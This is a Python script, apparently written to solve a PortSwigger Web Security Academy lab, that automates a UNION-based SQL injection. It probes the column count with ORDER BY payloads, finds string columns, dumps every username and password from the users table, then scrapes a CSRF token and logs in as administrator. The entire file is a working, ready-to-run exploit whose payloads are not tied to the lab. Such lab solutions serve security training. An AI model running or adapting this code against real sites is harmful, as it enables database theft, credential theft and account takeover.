#!/usr/bin/env python3
import sys
import warnings
from typing import Dict, List, Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

# Configurations
FILTER_ENDPOINT = "filter"
LOGIN_ENDPOINT = "login"
REQUEST_TIMEOUT = (2, 5)
MAX_COL_TO_TEST = 10
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


warnings.filterwarnings("ignore", message="Unverified HTTPS request")


def send_request(
    session: Session,
    url: str,
    params: Optional[dict] = None,
    data: Optional[dict] = None,
    proxies: Optional[dict] = None,
    method: str = "GET",
) -> Optional[Response]:
    """Helper to handle all HTTP communication"""
    headers = {"User-Agent": "Security-Scanner-v1", "Connection": "close"}

    try:
        return session.request(
            method=method,
            url=url,
            params=params,
            data=data,
            headers=headers,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=True,
            proxies=proxies,
            verify=False,
        )
    except RequestException as e:
        print(f"[-] Request failed: {e}")
        return None


def check_alive(session: Session, url: str) -> bool:
    """Checks if the lab URL is still alive"""
    print("[*] Phase 1: Checking if URL is alive...")
    res = send_request(session, url)
    return res is not None and res.status_code == 200


def find_column_count(session: Session, base_url: str, proxies: Optional[dict]) -> int:
    """Uses ORDER By to find number of columns"""
    print("[*] Phase 2: Determining column count...")
    target_url = urljoin(base_url, FILTER_ENDPOINT)

    for i in range(1, MAX_COL_TO_TEST + 1):
        payload = f"Pets' ORDER By {i} --"
        res = send_request(
            session, target_url, params={"category": payload}, proxies=proxies
        )
        if res is None or res.status_code != 200:
            return i - 1
    return 0


def find_string_column(
    session: Session, base_url: str, col_count: int, proxies: Optional[dict]
) -> List[int]:
    """Uses UNION SELECT to find column that accept string data"""
    print("[*] Phase 3: Finding string-compatible columns...")
    target_url = urljoin(base_url, FILTER_ENDPOINT)
    marker = "asif"
    indices = []

    for i in range(col_count):
        cols = ["NULL"] * col_count
        cols[i] = f"'{marker}'"
        payload = f"Pets' UNION SELECT {','.join(cols)} --"
        res = send_request(
            session, target_url, params={"category": payload}, proxies=proxies
        )
        if res and marker in res.text:
            indices.append(i)
    return indices


def print_all_users(html_content: str) -> Dict[str, str]:
    """Parses the HTML and prints all the username, password pairs in the table"""
    soup = BeautifulSoup(html_content, "html.parser")
    creds = {}

    print("\n[+] --- Dumped User Data ---")
    print(f"{'Username':<25} | {'Password'}")
    print("-" * 50)

    for th in soup.find_all("th"):
        td = th.find_next_sibling("td")
        if not td:
            continue
        username = th.get_text(strip=True)
        password = td.get_text(strip=True)
        if username and password and " " not in username:
            creds[username] = password
            print(f"{username:<25} | {password}")

    print("-" * 50 + "\n")
    return creds


def dump_and_extract(
    session: Session,
    url: str,
    col_count: int,
    str_indices: List[int],
    proxies: Optional[dict],
) -> Optional[str]:
    """Performs SQLi and returns administrator password"""
    print("[*] Phase 4: Dumping 'users' table...")
    target_url = urljoin(url, FILTER_ENDPOINT)
    u_idx, p_idx = str_indices[0], str_indices[1]

    cols = ["NULL"] * col_count
    cols[u_idx] = "username"
    cols[p_idx] = "password"

    payload = f"Pets' UNION SELECT {','.join(cols)} FROM users --"
    res = send_request(
        session, target_url, params={"category": payload}, proxies=proxies
    )

    if res and res.status_code == 200:
        all_creds = print_all_users(res.text)
        return all_creds.get("administrator")
    return None


def login(
    session: Session, base_url: str, password: str, proxies: Optional[dict]
) -> bool:
    """Extracts CSRF token and attempts to login as administrator"""
    print("[*] Phase 5: Loggin in as administrator...")
    login_url = urljoin(base_url, LOGIN_ENDPOINT)

    # Get CSRF token
    res = send_request(session, login_url, proxies=proxies)
    if not res:
        return False

    soup = BeautifulSoup(res.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})
    if not csrf_token:
        print("[-] Could not find CSRF token.")
        return False

    payload = {
        "csrf": csrf_token.get("value"),
        "username": "administrator",
        "password": password,
    }

    res = send_request(
        session, url=login_url, data=payload, proxies=proxies, method="POST"
    )
    return res is not None and (
        "Log out" in res.text or "Your username is: administrator" in res.text
    )


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].rstrip("/")
    session = Session()

    if not check_alive(session, url):
        print("[-] URL is not active!")
        return

    col_count = find_column_count(session, url, BURP_PROXIES)
    if col_count == 0:
        print("[-] Could determine no of columns.")
        return

    str_indices = find_string_column(session, url, col_count, BURP_PROXIES)
    if len(str_indices) < 2:
        print("[-] Need atleast 2 string columns to dump 'users' efficiently.")
        return

    admin_pass = dump_and_extract(session, url, col_count, str_indices, BURP_PROXIES)

    if admin_pass:
        if login(session, url, admin_pass, BURP_PROXIES):
            print("[!] SUCCESS: Logged in and lab solved.")
        else:
            print("[-] Login failed!")
    else:
        print("[-] administrator password not found in dump!")


if __name__ == "__main__":
    main()
